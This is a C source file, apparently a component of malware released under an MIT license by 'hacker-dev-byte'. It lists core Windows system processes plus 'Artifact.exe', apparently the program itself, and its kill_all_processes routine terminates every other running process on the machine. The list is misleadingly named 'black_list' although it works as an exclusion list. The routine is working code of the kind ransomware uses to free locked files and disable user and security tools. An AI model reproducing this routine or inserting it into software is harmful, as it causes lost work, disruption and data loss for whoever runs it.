/*
MIT License

Copyright (c) 2024 hacker-dev-byte

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Processes.h"

_TCHAR* black_list_processes[] =
{
	_T("svchost.exe"),
	_T("ctfmon.exe"),
	_T("smss.exe"),
	_T("dwm.exe"),
	_T("csrss.exe"),
	_T("lsass.exe"),
	_T("wininit.exe"),
	_T("wlanext.exe"),
	_T("conhost.exe"),
	_T("winlogon.exe"),
	_T("sihost.exe"),
	_T("spoolsv.exe"),
	_T("explorer.exe"),
	_T("smartscreen.exe"),
	_T("taskhostw.exe"),
	_T("fontdrvhost.exe"),
	_T("services.exe"),
	_T("RuntimeBroker.exe"),
	_T("SecurityHealthService.exe"),
	_T("ShellExperienceHost.exe"),
	_T("SystemSettings.exe"),
	_T("SystemSettingsBroker.exe"),
	_T("PresentationFontCache.exe"),
	_T("ApplicationFrameHost.exe"),
	_T("StartMenuExperienceHost.exe"),
	_T("SgrmBroker.exe"),
	_T("SearchApp.exe"),
	_T("Taskmgr.exe"),
	_T("System"),
	_T("Registry"),
	_T("Memory Compression"),
	_T("Artifact.exe")
};

static bool find_in_array(_TCHAR** arr, INT size, _TCHAR* value)
{
	for (INT i = 0; i < size; i++)
		if (!lstrcmp(arr[i], value))
			return true;
	return false;
}

VOID kill_all_processes() 
{
	HANDLE hSnapShot = NULL;
	if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) 
		ExitProcess(0);

	PROCESSENTRY32 pe32;
	ZeroMemory(&pe32, sizeof(pe32));
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapShot, &pe32))
		ExitProcess(0);

	INT black_list_size = _countof(black_list_processes);
	_TCHAR** black_list_ptr = black_list_processes;

	do
	{
		if (!find_in_array(black_list_ptr, black_list_size, pe32.szExeFile))
		{
			HANDLE hProcess = NULL;
			if ((hProcess = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID))) 
			{
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
		}
	} while (Process32Next(hSnapShot, &pe32));
	CloseHandle(hSnapShot);
}